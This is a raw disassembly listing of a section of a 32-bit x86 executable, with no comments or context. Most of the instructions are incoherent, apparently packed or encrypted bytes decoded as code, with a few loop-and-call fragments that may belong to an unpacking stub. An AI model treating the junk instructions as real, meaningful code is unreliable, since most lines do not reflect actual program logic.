  40bd8f:	mov    eax,ds
  40bd91:	mov    ch,0x22
  40bd93:	(bad)  
  40bd94:	and    eax,DWORD PTR [eax+0x56]
  40bd97:	mov    ebp,0x252de150
  40bd9c:	jns    0x40bd2e
  40bd9e:	pushf  
  40bd9f:	aad    0xe8
  40bda1:	pop    es
  40bda2:	iret   
  40bda3:	jge    0x40bd34
  40bda5:	test   BYTE PTR [ebp+0x57],ch
  40bda8:	enter  0x99c2,0xab
  40bdac:	das    
  40bdad:	sti    
  40bdae:	mov    ebx,0x368c7480
  40bdb3:	cmp    BYTE PTR [ebx],bl
  40bdb5:	push   ebp
  40bdb6:	sbb    eax,ecx
  40bdb8:	jb     0x40bd89
  40bdba:	inc    eax
  40bdbb:	xacquire xchg DWORD PTR [edx],edx
  40bdbe:	(bad)
  40bdc2:	push   cs
  40bdc3:	pushf  
  40bdc4:	pop    ds
  40bdc5:	arpl   sp,cx
  40bdc7:	inc    edi
  40bdc8:	push   ebx
  40bdc9:	and    edx,DWORD PTR [edi]
  40bdcb:	adc    edx,edi
  40bdcd:	cli    
  40bdce:	sbb    eax,0xb60c4388
  40bdd3:	call   0xd700:0x49c2ef0e
  40bdda:	xchg   ecx,eax
  40bddb:	jae    0x40bdb1
  40bddd:	test   eax,0xf32a9897
  40bde2:	jecxz  0x40be15
  40bde4:	icebp  
  40bde5:	sbb    BYTE PTR [eax],cl
  40bde7:	dec    ebx
  40bde8:	jne    0x40bdfe
  40bdea:	and    ebx,ebx
  40bdec:	mov    WORD PTR [esi+eiz*2+0x77],gs
  40bdf0:	pushf  
  40bdf1:	push   ss
  40bdf2:	out    0x7,al
  40bdf4:	cmp    al,0xc2
  40bdf6:	push   cs
  40bdf7:	fild   QWORD PTR [esi-0x64]
  40bdfa:	cmp    edx,DWORD PTR [ebx+0x33]
  40bdfd:	bnd jno 0x40be59
  40be00:	mov    edx,0xda44a8b9
  40be05:	xchg   ebx,eax
  40be06:	sub    al,0x93
  40be08:	fucomp st(0)
  40be0a:	mov    dh,0x64
  40be0c:	cmc    
  40be0d:	int3   
  40be0e:	stos   DWORD PTR es:[edi],eax
  40be0f:	and    eax,DWORD PTR [esi+0x4e6633e]
  40be15:	jl     0x40be04
  40be17:	in     al,dx
  40be18:	(bad)  [ebx]
  40be1a:	xlat   BYTE PTR fs:[ebx]
  40be1c:	mov    cl,BYTE PTR [ecx]
  40be1e:	mov    bh,0x8a
  40be20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be21:	int3   
  40be22:	imul   edx,esi,0x70fb7a15
  40be28:	mov    ?,WORD PTR [esi+0x37637e1f]
  40be2e:	nop
  40be2f:	inc    edi
  40be30:	mov    ah,0x86
  40be32:	and    al,0x6a
  40be34:	mov    bl,0xdd
  40be36:	adc    eax,0x50c63637
  40be3b:	push   ebx
  40be3c:	sahf   
  40be3d:	xor    bl,BYTE PTR fs:[edx+0x74]
  40be41:	xlat   BYTE PTR ds:[ebx]
  40be42:	lds    edx,FWORD PTR [eax-0x77]
  40be45:	or     DWORD PTR [esi],0xa5b1019
  40be4b:	mov    al,BYTE PTR [eax]
  40be4d:	add    al,0x37
  40be4f:	and    DWORD PTR ds:0x432e5e,0x432780
  40be59:	xor    al,0x47
  40be5b:	cmp    al,0xc3
  40be5d:	mov    DWORD PTR ds:0x432e56,0x1383
  40be67:	jne    0x40c344
  40be6d:	mov    eax,DWORD PTR [ebp+0x8]
  40be70:	mov    ecx,DWORD PTR [ebp+0x8]
  40be73:	movzx  edx,BYTE PTR ds:0x4344a1
  40be7a:	xor    edx,DWORD PTR ds:0x434499
  40be80:	mov    DWORD PTR ds:0x4344a1,edx
  40be86:	add    ecx,DWORD PTR [eax+0x3c]
  40be89:	xor    eax,edx
  40be8b:	mov    edx,0x7510855
  40be90:	mov    DWORD PTR [ebp+0x8],ecx
  40be93:	or     ecx,0x72e5
  40be99:	mov    eax,DWORD PTR [ebp-0x4]
  40be9c:	and    DWORD PTR ds:0x4344a1,0x0
  40bea6:	mov    ecx,DWORD PTR ds:0x4344a1
  40beac:	inc    ecx
  40bead:	mov    DWORD PTR ds:0x4344a1,ecx
  40beb3:	cmp    DWORD PTR ds:0x4344a1,0x25
  40beba:	jne    0x40bed6
  40bec0:	push   0x4328c9
  40bec5:	push   DWORD PTR [ebp-0x24]
  40bec8:	push   0x7ea1
  40becd:	push   DWORD PTR [ebp-0x24]
  40bed0:	call   DWORD PTR ds:0x432d9a
  40bed6:	cmp    DWORD PTR ds:0x4344a1,0x17
  40bedd:	jb     0x40bea6
  40bee3:	xor    eax,edx
  40bee5:	push   esi
  40bee6:	jmp    0x40c101
  40beeb:	je     0x40befe
  40beed:	test   DWORD PTR [ebp+eiz*2+0x4df17194],eax
  40bef4:	pop    eax
  40bef5:	pop    esp
  40bef6:	or     dh,BYTE PTR [edx-0x70]
  40bef9:	jmp    0x40bf57
  40befb:	jnp    0x40bef9
  40befd:	jo     0x40bf6f
  40beff:	jb     0x40bf80
  40bf01:	jo     0x40bf73
  40bf03:	or     ecx,ecx
  40bf05:	pop    es
  40bf06:	ss jns 0x40beab
  40bf09:	mov    BYTE PTR [edx+0x11],dh
  40bf0c:	mov    cl,0x24
  40bf0e:	test   esi,esi
  40bf10:	stos   DWORD PTR es:[edi],eax
  40bf11:	cs pop ebp
  40bf13:	enter  0xfe57,0xce
  40bf17:	sbb    dl,cl
  40bf19:	loope  0x40bf00
  40bf1b:	jl     0x40bf0e
  40bf1d:	push   edx
  40bf1e:	(bad)  
  40bf1f:	cmp    eax,0xf299ec73
  40bf24:	sub    ch,BYTE PTR [edi+0x3d]
  40bf27:	pop    ebx
  40bf28:	mov    cl,bl
  40bf2a:	cs xchg edx,eax
  40bf2c:	jnp    0x40bec9
  40bf2e:	sub    al,bh
  40bf30:	jecxz  0x40bed0
  40bf32:	xchg   edx,eax
  40bf33:	popa   
  40bf34:	(bad)  
  40bf35:	sti    
  40bf36:	inc    eax
  40bf37:	jbe    0x40bf3a
  40bf39:	lock or al,0x84
  40bf3c:	sti    
  40bf3d:	and    cl,0x78
  40bf40:	enter  0x336b,0x5d
  40bf44:	inc    edi
  40bf45:	mov    ah,0xac
  40bf47:	aaa    
  40bf48:	jp     0x40bf70
  40bf4a:	mov    ecx,DWORD PTR [ebx+0x3315bedc]
  40bf50:	dec    ebp
  40bf51:	push   0xffffffa9
  40bf53:	scas   al,BYTE PTR es:[edi]
  40bf54:	mov    eax,DWORD PTR [bp+si]
  40bf57:	push   esi
  40bf58:	inc    edx
  40bf59:	inc    ebx
  40bf5a:	fistp  QWORD PTR [ebx+0x598e1f1d]
  40bf60:	shl    DWORD PTR [edx-0x73],0x70
  40bf64:	daa    
  40bf65:	pop    eax
  40bf66:	out    0xd3,eax
  40bf68:	test   al,0x68
  40bf6a:	jp     0x40bfbf
  40bf6c:	jmp    0x6fc1cef4
  40bf71:	aam    0x58
  40bf73:	xchg   ecx,eax
  40bf74:	sub    BYTE PTR [edx+esi*8+0x3b],al
  40bf78:	ficomp WORD PTR [edi]
  40bf7a:	or     BYTE PTR [ecx],ch
  40bf7c:	fcmovb st,st(3)
  40bf7e:	cmc    
  40bf7f:	jne    0x40bfb9
  40bf81:	adc    al,0xd5
  40bf83:	scas   al,BYTE PTR es:[edi]
  40bf84:	mov    esi,0xeaf78a81
  40bf89:	fisttp DWORD PTR [edx+0x60]
  40bf8c:	lods   eax,DWORD PTR ds:[esi]
  40bf8d:	jne    0x40bf74
  40bf8f:	inc    esp
  40bf90:	popf   
  40bf91:	iret   
  40bf92:	setbe  BYTE PTR [eax-0x2b]
  40bf96:	data16 jns 0x40bf4b
  40bf99:	hlt    
  40bf9a:	jmp    0x76df:0x99b20487
  40bfa1:	cs cwde 
  40bfa3:	shl    DWORD PTR [eax],1
  40bfa5:	(bad)
  40bfa8:	mov    ebp,0xaa3cffa7
  40bfad:	int    0x76
  40bfaf:	add    DWORD PTR [edi+ecx*4],ebp
  40bfb2:	lock mov dh,BYTE PTR [edx-0x3b]
  40bfb6:	(bad)  
  40bfb8:	repnz scas al,BYTE PTR es:[edi]
  40bfba:	shl    BYTE PTR [ebp+0x49f28b8e],1
  40bfc0:	mov    ecx,0x8536a8f2
  40bfc5:	jl     0x40c01b
  40bfc7:	(bad)  
  40bfc8:	jmp    0xda807ce7
  40bfcd:	jecxz  0x40c03a
  40bfcf:	das    
  40bfd0:	jnp    0x40bfd6
  40bfd2:	push   ss
  40bfd3:	add    eax,0x75b54a2d
  40bfd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfd9:	sbb    DWORD PTR [edi-0x1bb9d894],edx
  40bfdf:	sub    BYTE PTR [ebx+0xe56f9a6],al
  40bfe5:	bound  eax,QWORD PTR [edi+eax*4-0x4]
  40bfe9:	push   es
  40bfea:	popa   
  40bfeb:	in     eax,0x4e
  40bfed:	push   esi
  40bfee:	mov    esi,0x3ddc5f6e
  40bff3:	jb     0x40c043
  40bff5:	js     0x40c06e
  40bff7:	pop    edi
  40bff8:	(bad)  
  40bff9:	(bad)  
  40bffa:	xcrypt-ofb (bad)
  40bffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bffc:	sub    DWORD PTR [esi+eax*4+0x7769b00f],esp
  40c003:	mov    BYTE PTR [edx],ch
  40c005:	push   cs
  40c006:	add    ebx,ebp
  40c008:	and    eax,0x2ddb858f
  40c00d:	cmp    ah,BYTE PTR [esi]
  40c00f:	cmp    DWORD PTR [eax-0x68],edx
  40c012:	mov    ?,WORD PTR [ecx-0x18]
  40c015:	mov    bl,0x6a
  40c017:	pop    eax
  40c018:	pop    esi
  40c019:	adc    al,0x23
  40c01b:	test   BYTE PTR [edi+ecx*1+0x3877bee3],bh
  40c022:	mov    eax,ds:0x1ff9f87d
  40c027:	int    0xe7
  40c029:	cmp    edi,DWORD PTR [ebx-0x33bd5759]
  40c02f:	addr16 pop esp
  40c031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c032:	mov    esp,0x2a6e40f7
  40c037:	mov    eax,ds:0xf4ee590d
  40c03c:	ret    0x1304
  40c03f:	ins    BYTE PTR es:[edi],dx
  40c040:	pop    esp
  40c041:	jns    0x40bfc3
  40c043:	inc    edi
  40c044:	retf   0x32ea
  40c047:	es push cs
  40c049:	xor    BYTE PTR [ecx],0x49
  40c04c:	es push ebp
  40c04e:	jno    0x40bfe4
  40c050:	xchg   DWORD PTR [esp+edi*4],edx
  40c053:	pop    es
  40c054:	(bad)
  40c058:	xor    eax,0xc66ac0b7
  40c05d:	rol    BYTE PTR [ebx+0x4c939946],cl
  40c063:	shl    BYTE PTR ds:[ebx-0x6a],cl
  40c067:	xchg   esp,eax
  40c068:	call   0xe684c62e
  40c06d:	cs add bh,cl
  40c070:	in     al,dx
  40c071:	inc    ebx
  40c072:	cwde   
  40c073:	or     BYTE PTR [esp+ebp*2],bl
  40c076:	sub    DWORD PTR [eax-0x643d5f04],eax
  40c07c:	add    edx,DWORD PTR [ebp-0x61b92cce]
  40c082:	adc    al,0x7
  40c084:	es cmp al,0xe1
  40c087:	arpl   ax,cx
  40c089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c08a:	xchg   edx,eax
  40c08b:	aam    0x62
  40c08d:	retf   0x987f
  40c090:	xchg   ch,cl
  40c092:	sbb    BYTE PTR [esi+0x7c3d3fd],ch
  40c098:	hlt    
  40c099:	data16 (bad) 
  40c09b:	cdq    
  40c09c:	mov    ch,0x3
  40c09e:	retf   0xb62d
  40c0a1:	add    DWORD PTR [ebx+0x1f321a40],ebx
  40c0a7:	push   edx
  40c0a8:	inc    esi
  40c0a9:	inc    edi
  40c0aa:	or     esi,DWORD PTR [edi-0xc4b97a5]
  40c0b0:	outs   dx,BYTE PTR ds:[esi]
  40c0b1:	jmp    0x128b:0xdbe8d1ed
  40c0b8:	ds cmp ch,al
  40c0bb:	or     bh,dl
  40c0bd:	fldenv [ecx+0x22]
  40c0c0:	clc    
  40c0c1:	push   ss
  40c0c2:	push   ecx
  40c0c3:	ror    DWORD PTR [ebx-0x983b403],0x9f
  40c0ca:	fldcw  WORD PTR [ecx]
  40c0cc:	jl     0x40c065
  40c0ce:	push   0x66
  40c0d0:	mov    dl,0xc7
  40c0d2:	inc    edi
  40c0d3:	jae    0x40c124
  40c0d5:	std    
  40c0d6:	push   edx
  40c0d7:	or     dh,BYTE PTR ds:0x9184863e
  40c0dd:	sub    edx,edx
  40c0df:	ins    BYTE PTR es:[edi],dx
  40c0e0:	rcl    DWORD PTR [esi+0x22],1
  40c0e3:	lahf   
  40c0e4:	and    DWORD PTR [edx+eax*4],edi
  40c0e7:	cs sub eax,0x1c944ba0
  40c0ed:	jg     0x40c124
  40c0ef:	clc    
  40c0f0:	inc    edi
  40c0f1:	or     dh,dl
  40c0f3:	mov    ecx,0x9c77dc2b
  40c0f8:	mov    ah,0x90
  40c0fa:	out    dx,eax
  40c0fb:	aam    0xb8
  40c0fd:	call   0x8b5a54b7
  40c102:	jne    0x40c10c
  40c104:	mov    ecx,0x32729c
  40c109:	add    eax,ecx
  40c10b:	jmp    0x40c326
  40c110:	cli    
  40c111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c112:	push   ds
  40c113:	in     eax,0x21
  40c115:	gs inc ecx
  40c117:	arpl   WORD PTR [ebp*1+0x49d853b5],si
  40c11e:	or     BYTE PTR [eax],bh
  40c120:	jge    0x40c11c
  40c122:	jo     0x40c194
  40c124:	jb     0x40c1a5
  40c126:	jo     0x40c198
  40c128:	xchg   esi,eax
  40c129:	loopne 0x40c10e
  40c12b:	mov    ?,WORD PTR [ecx+0x72]
  40c12e:	pushf  
  40c12f:	cli    
  40c130:	test   BYTE PTR [edi-0x44],ch
  40c133:	xchg   edi,eax
  40c134:	test   DWORD PTR [ebx+ebp*4+0x34],edx
  40c138:	int3   
  40c139:	mov    ds:0x86a0a9eb,al
  40c13e:	fiadd  DWORD PTR [ebp-0x3c]
  40c141:	loope  0x40c10e
  40c143:	adc    eax,0x73e34f41
  40c148:	in     eax,0xb5
  40c14a:	cmp    edi,ebx
  40c14c:	add    BYTE PTR [ecx+0x32],0xbc
  40c150:	xor    eax,0x5e992182
  40c155:	in     al,0x9a
  40c157:	fwait
  40c158:	repz push cs
  40c15a:	jbe    0xecf38f28
  40c160:	outs   dx,DWORD PTR ds:[esi]
  40c161:	retf   0x4651
  40c164:	cld    
  40c165:	mov    ebp,ecx
  40c167:	ret    
  40c168:	pop    eax
  40c169:	test   DWORD PTR [esp+ebx*8+0x864d1db],ebx
  40c170:	xchg   ebp,edx
  40c172:	mov    al,0x92
  40c174:	sbb    edi,DWORD PTR [edi-0x57]
  40c177:	pushf  
  40c178:	mov    ebx,0x1e94f4ab
  40c17d:	out    dx,al
  40c17e:	dec    ebx
  40c17f:	cmp    al,BYTE PTR [eax+esi*1+0x4e]
  40c183:	and    al,0x2f
  40c185:	jnp    0x40c18f
  40c187:	and    ecx,DWORD PTR [eax+0x530a79d1]
  40c18d:	in     eax,dx
  40c18e:	mov    eax,ds:0xc706c788
  40c193:	pop    edx
  40c194:	mov    ?,WORD PTR [esi+0x7378e395]
  40c19a:	mov    cs,WORD PTR [bx+0x18ce]
  40c19f:	ret    
  40c1a0:	fimul  DWORD PTR [ebp+0xe09c5b2]
  40c1a6:	mov    ds:0x2ec125a0,al
  40c1ab:	aad    0x8b
  40c1ad:	loopne 0x40c14d
  40c1af:	imul   edi,DWORD PTR [esi+0x766d997],0x731999b1
  40c1b9:	adc    esp,0x710ad00f
  40c1bf:	les    edi,FWORD PTR [edi-0x50e98822]
  40c1c5:	scas   eax,DWORD PTR es:[edi]
  40c1c6:	stos   BYTE PTR es:[edi],al
  40c1c7:	jno    0x40c1f1
  40c1c9:	jae    0x40c178
  40c1cb:	lock xchg ecx,eax
  40c1cd:	das    
  40c1ce:	sbb    cl,cl
  40c1d0:	shr    DWORD PTR [eax+ebx*1-0x21442561],1
  40c1d7:	inc    edi
  40c1d8:	int3   
  40c1d9:	loopne 0x40c175
  40c1db:	and    BYTE PTR [edi+0x2a],0x80
  40c1df:	push   ds
  40c1e0:	fwait
  40c1e1:	jae    0x40c23b
  40c1e3:	jecxz  0x40c20f
  40c1e5:	xchg   esp,eax
  40c1e6:	fld    QWORD PTR [edi+0x3af6c82]
  40c1ec:	imul   DWORD PTR [edx+ebx*8-0x34]
  40c1f0:	push   edx
  40c1f1:	(bad)  
  40c1f2:	add    edx,DWORD PTR [eax]
  40c1f4:	jl     0x40c24f
  40c1f6:	sbb    edi,DWORD PTR [ecx-0xb]
  40c1f9:	push   esi
  40c1fa:	mov    bh,BYTE PTR [esi+0x50]
  40c1fd:	mov    eax,0x3e53fe53
  40c202:	pusha  
  40c203:	cwde   
  40c204:	das    
  40c205:	in     eax,0xcb
  40c207:	push   edx
  40c208:	cs jne 0x40c263
  40c20b:	or     al,0x8a
  40c20d:	adc    al,0x6a
  40c20f:	mov    ebp,0x601936ad
  40c214:	js     0x40c28a
  40c216:	div    dl
  40c218:	shl    DWORD PTR [esi+0x27],1
  40c21b:	mov    ch,0x24
  40c21d:	lea    edi,[ebx-0x32a8f083]
  40c223:	or     eax,0x264ebce7
  40c228:	add    dl,BYTE PTR [ebx+0xf96de5c]
  40c22e:	pushf  
  40c22f:	lods   eax,DWORD PTR ds:[esi]
  40c230:	das    
  40c231:	fnstcw WORD PTR [eax-0x3a9bd7c2]
  40c237:	push   edi
  40c238:	sub    eax,0xb1871af8
  40c23d:	test   BYTE PTR [edi],ah
  40c23f:	mov    WORD PTR [edx+0x5b],?
  40c242:	pop    ecx
  40c243:	xor    BYTE PTR [ebp+0x79d37ff1],0xb1
  40c24a:	mov    eax,ds:0xcf18ba4d
  40c24f:	jno    0x40c1f1
  40c251:	aad    0xa5
  40c253:	mov    ds:0xc57bdee7,al
  40c258:	test   esi,edi
  40c25a:	sahf   
  40c25b:	push   ds
  40c25c:	imul   BYTE PTR [edx]
  40c25e:	or     eax,0x919438cd
  40c263:	cmp    DWORD PTR [edx+0x40e5ad8d],ebp
  40c269:	imul   ecx,DWORD PTR [ebx],0x1fdbc8b4
  40c26f:	and    al,0x22
  40c271:	aaa    
  40c272:	out    dx,eax
  40c273:	mov    dl,0xc1
  40c275:	or     al,0xf4
  40c277:	mov    ah,0xc2
  40c279:	pop    ebx
  40c27a:	xor    DWORD PTR [esp+edi*8-0x28],ecx
  40c27e:	push   edx
  40c27f:	mov    ch,0xa6
  40c281:	out    0x31,eax
  40c283:	add    BYTE PTR [ebp-0x11],bl
  40c286:	add    DWORD PTR [edi-0x1eb46622],eax
  40c28c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c28d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c28e:	bound  esp,QWORD PTR [eax]
  40c290:	jbe    0x40c2cd
  40c292:	mov    edi,0x63ac0124
  40c297:	shl    DWORD PTR [ecx],cl
  40c299:	or     al,0x2b
  40c29b:	lahf   
  40c29c:	xchg   esi,eax
  40c29d:	ficomp DWORD PTR [ebx-0x1a15c721]
  40c2a3:	xor    al,0x5c
  40c2a5:	cli    
  40c2a6:	jns    0x40c22d
  40c2a8:	pop    eax
  40c2a9:	sub    cl,al
  40c2ab:	outs   dx,DWORD PTR ds:[esi]
  40c2ac:	jl     0x40c2d7
  40c2ae:	popf   
  40c2af:	xchg   BYTE PTR [ecx],al
  40c2b1:	sbb    cl,bh
  40c2b3:	xor    ebx,DWORD PTR [ecx+0x6f41eec5]
  40c2b9:	push   edx
  40c2ba:	jecxz  0x40c292
  40c2bc:	and    BYTE PTR [ecx],bl
  40c2be:	jne    0x40c2c1
  40c2c0:	mov    ebp,?
  40c2c2:	lahf   
  40c2c3:	hlt    
  40c2c4:	loop   0x40c264
  40c2c6:	cmp    eax,0x1207ef72
  40c2cb:	lds    edx,FWORD PTR [esi-0x71154ba7]
  40c2d1:	ja     0x40c2e9
  40c2d3:	stos   DWORD PTR es:[edi],eax
  40c2d4:	pop    ds
  40c2d5:	pushf  
  40c2d6:	(bad)  
  40c2d7:	stc    
  40c2d8:	jmp    0x589c586b
  40c2dd:	pop    ecx
  40c2de:	jle    0x40c2da
  40c2e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2e1:	mov    ds:0x9328d18a,eax
  40c2e6:	fcom   DWORD PTR [edx+ecx*2]
  40c2e9:	mov    edx,ds
  40c2eb:	out    dx,eax
  40c2ec:	xchg   edi,eax
  40c2ed:	stos   BYTE PTR es:[edi],al
  40c2ee:	enter  0xde48,0xf0
  40c2f2:	(bad)  
  40c2f3:	push   esi
  40c2f4:	push   0xa36d85b8
  40c2f9:	mov    ch,0xb1
  40c2fb:	(bad)  
  40c2fc:	or     DWORD PTR [eax],edi
  40c2fe:	dec    esp
  40c2ff:	push   edx
  40c300:	icebp  
  40c301:	pop    es
  40c302:	and    eax,DWORD PTR [ecx+esi*2]
  40c305:	jmp    0x40c2e1
  40c307:	sbb    dh,BYTE PTR [ecx]
  40c309:	scas   al,BYTE PTR es:[edi]
  40c30a:	inc    eax
  40c30b:	retf   
  40c30c:	push   ecx
  40c30d:	and    DWORD PTR [eax-0x67],ebx
  40c310:	xchg   dh,bl
  40c312:	loope  0x40c367
  40c314:	lds    eax,FWORD PTR ds:0x1dd163f1
  40c31a:	call   0x97e5fc20
  40c31f:	push   edi
  40c320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c321:	jns    0x40c2ad
  40c323:	xchg   al,cl
  40c325:	xor    eax,0x5e544639
  40c32a:	je     0x40c338
  40c330:	mov    eax,DWORD PTR [ebp+0x8]
  40c333:	jmp    0x40c787
  40c338:	mov    eax,DWORD PTR [ebp-0x4]
  40c33b:	xor    eax,edx
  40c33d:	add    eax,ecx
  40c33f:	jmp    0x40c787
  40c344:	mov    eax,DWORD PTR [ebp-0x4]
  40c347:	jmp    0x40c562
  40c34c:	or     eax,0x739e7462
  40c351:	scas   al,BYTE PTR es:[edi]
  40c352:	shl    DWORD PTR [ecx-0x41],1
  40c355:	jb     0x40c38a
  40c357:	loop   0x40c36f
  40c359:	mov    ebp,0xf87f17b9
  40c35e:	jo     0x40c3d0
  40c360:	jb     0x40c3e1
  40c362:	jo     0x40c3d4
  40c364:	cmp    edi,DWORD PTR [ebp+0x4]
  40c367:	jmp    0x5815:0xf3c0d74
  40c36e:	test   al,0x56
  40c370:	push   ebp
  40c371:	in     eax,dx
  40c372:	inc    eax
  40c373:	fiadd  WORD PTR [edi-0x3b751ff6]
  40c379:	mov    BYTE PTR [ebx-0x41],ch
  40c37c:	lahf   
  40c37d:	in     eax,0x77
  40c37f:	add    bl,BYTE PTR [eax]
  40c381:	sbb    BYTE PTR gs:[ecx],bl
  40c384:	inc    edi
  40c385:	adc    DWORD PTR [esi+0x4],ebx
  40c388:	cmc    
  40c389:	push   edi
  40c38a:	retf   0xd86
  40c38d:	jno    0x40c386
  40c38f:	(bad)  
  40c390:	cld    
  40c391:	pop    es
  40c392:	lock (bad) 
  40c394:	iret   
  40c395:	cli    
  40c396:	sub    al,bh
  40c398:	pop    ecx
  40c399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c39a:	dec    ebp
  40c39b:	sbb    BYTE PTR [ebp+0x17],cl
  40c39e:	mov    esi,0x45e791bb
  40c3a3:	jns    0x40c3df
  40c3a5:	mul    DWORD PTR [esi-0x6e92ca61]
  40c3ab:	std    
  40c3ac:	scas   al,BYTE PTR es:[edi]
  40c3ad:	ins    BYTE PTR es:[edi],dx
  40c3ae:	xchg   esi,eax
  40c3af:	sbb    BYTE PTR [edi+0x5b],0x34
  40c3b3:	mov    ebp,0xe4b6442
  40c3b8:	and    bl,BYTE PTR [ebx-0x7b]
  40c3bb:	cld    
  40c3bc:	out    dx,al
  40c3bd:	je     0x40c3b9
  40c3bf:	nop
  40c3c0:	hlt    
  40c3c1:	shl    BYTE PTR [eax+0x1e],1
  40c3c4:	push   0x9be64b0d
  40c3c9:	mov    BYTE PTR [ebx+0x2],dh
  40c3cc:	pushf  
  40c3cd:	(bad)  
  40c3ce:	ds cmc 
  40c3d0:	cmp    eax,0xbd40a6d0
  40c3d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3d6:	test   al,0x88
  40c3d8:	sbb    eax,0x5d800ffd
  40c3dd:	add    BYTE PTR [ebp-0x72b43de0],bh
  40c3e3:	pop    esi
  40c3e4:	into   
  40c3e5:	push   ds
  40c3e6:	mov    BYTE PTR [esi+0x16dae944],bh
  40c3ec:	rol    DWORD PTR [esp+esi*1],cl
  40c3ef:	inc    esp
  40c3f0:	cmp    esp,DWORD PTR [ebx+0x34610f5a]
  40c3f6:	rcl    BYTE PTR [eax],1
  40c3f8:	scas   eax,DWORD PTR es:[edi]
  40c3f9:	mov    ?,WORD PTR [ebx]
  40c3fb:	xchg   ebx,eax
  40c3fc:	pop    esi
  40c3fd:	jo     0x40c3a7
  40c3ff:	pop    edi
  40c400:	cdq    
  40c401:	mov    ah,0xff
  40c403:	leave  
  40c404:	or     eax,0x41569ce4
  40c409:	pop    edi
  40c40a:	mov    ebx,0xcca51422
  40c40f:	shr    DWORD PTR [ebx+edi*4+0x44b45be0],0x5a
  40c417:	xchg   esi,eax
  40c418:	sbb    cl,0xca
  40c41b:	pop    esp
  40c41c:	pop    es
  40c41d:	mov    ds:0xe964f533,eax
  40c422:	push   ecx
  40c423:	push   dx
  40c425:	scas   al,BYTE PTR es:[edi]
  40c426:	test   bh,dl
  40c428:	lea    ebx,ds:0x63cf733e
  40c42e:	retf   0x1d02
  40c431:	pop    esi
  40c432:	call   0x5725:0xe8068d0f
  40c439:	mov    ch,0x50
  40c43b:	jns    0x40c456
  40c43d:	cmp    BYTE PTR [edx+0x475857a1],dh
  40c443:	cmp    BYTE PTR [esi-0x50],ah
  40c446:	push   esp
  40c447:	test   al,0x91
  40c449:	sub    eax,0x98e73b88
  40c44e:	sti    
  40c44f:	mov    DWORD PTR ds:0x88f62a74,esp
  40c455:	jge    0x40c448
  40c457:	pop    esp
  40c458:	inc    ecx
  40c459:	fidivr WORD PTR [edi+0x42]
  40c45c:	je     0x40c4be
  40c45e:	or     esp,esi
  40c460:	push   0x8ab6c46a
  40c465:	and    al,0x29
  40c467:	jle    0x40c463
  40c469:	push   ecx
  40c46a:	jmp    0x3c22:0x5a863017
  40c471:	pop    ebp
  40c472:	mov    al,ds:0x5e462f8b
  40c477:	cmp    ecx,DWORD PTR [edi+0xc]
  40c47a:	mov    ebx,esp
  40c47c:	popa   
  40c47d:	pushw  ds
  40c47f:	sti    
  40c480:	cld    
  40c481:	cmp    dh,BYTE PTR [esi-0x4f]
  40c484:	fsubrp st(4),st
  40c486:	sub    ah,BYTE PTR [edx+edx*2]
  40c489:	repnz xchg ebp,eax
  40c48b:	xchg   edx,eax
  40c48c:	mov    ebx,0xdee60a02
  40c491:	popa   
  40c492:	in     al,dx
  40c493:	add    al,bl
  40c495:	(bad)  
  40c496:	mov    cl,0x5c
  40c498:	sub    ebx,DWORD PTR [ebp-0x38]
  40c49b:	dec    esp
  40c49c:	jle    0x40c448
  40c49e:	push   ebp
  40c49f:	adc    al,0x22
  40c4a1:	cmp    BYTE PTR [edx+0xc6c1f13],ah
  40c4a7:	adc    ah,bl
  40c4a9:	sbb    dl,al
  40c4ab:	ins    DWORD PTR es:[edi],dx
  40c4ac:	xchg   esi,eax
  40c4ad:	js     0x40c4cd
  40c4af:	repnz in eax,dx
  40c4b1:	pop    ecx
  40c4b2:	(bad)  
  40c4b3:	xchg   edx,eax
  40c4b4:	scas   al,BYTE PTR es:[edi]
  40c4b5:	mov    edi,0x747e8af3
  40c4ba:	test   BYTE PTR [ebx+0x14],dl
  40c4bd:	cld    
  40c4be:	jns    0x40c502
  40c4c0:	xlat   BYTE PTR ds:[ebx]
  40c4c1:	int3   
  40c4c2:	lahf   
  40c4c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4c4:	call   0xe7ebe5d0
  40c4c9:	and    eax,0x3f154be6
  40c4ce:	out    dx,al
  40c4cf:	mov    ch,0x25
  40c4d1:	add    DWORD PTR [ecx+0x63],ecx
  40c4d4:	jmp    0x40c4cc
  40c4d6:	into   
  40c4d7:	nop
  40c4d8:	add    eax,0xecf1d687
  40c4dd:	out    0x35,eax
  40c4df:	fld    TBYTE PTR [esi]
  40c4e1:	ins    BYTE PTR es:[edi],dx
  40c4e2:	inc    esi
  40c4e3:	push   ds
  40c4e4:	js     0x40c46b
  40c4e6:	mov    es,WORD PTR [eax]
  40c4e8:	shl    BYTE PTR [edi*1-0x50592979],cl
  40c4ef:	imul   edx,esp,0x45
  40c4f2:	adc    BYTE PTR [ecx],ch
  40c4f4:	popf   
  40c4f5:	add    BYTE PTR ds:0xff81e09c,0x77
  40c4fc:	sbb    DWORD PTR [edx-0x47],0x407c5281
  40c503:	out    0xc7,eax
  40c505:	mov    edx,0x73034aed
  40c50a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c50b:	cmp    cl,BYTE PTR [ebp-0x2f]
  40c50e:	mov    esi,0x70ee737c
  40c513:	dec    ecx
  40c514:	jns    0x40c54f
  40c516:	mov    ebp,0x6594b963
  40c51b:	aas    
  40c51c:	in     al,0xcb
  40c51e:	sub    eax,0x43b15f5f
  40c523:	mov    ch,0xb4
  40c525:	icebp  
  40c526:	loopne 0x40c59e
  40c528:	mov    cl,BYTE PTR [edx+eax*1-0x16]
  40c52c:	adc    eax,0x10f590d3
  40c531:	daa    
  40c532:	mov    ds:0x94be2d96,al
  40c537:	movhlps xmm5,xmm2
  40c53a:	cdq    
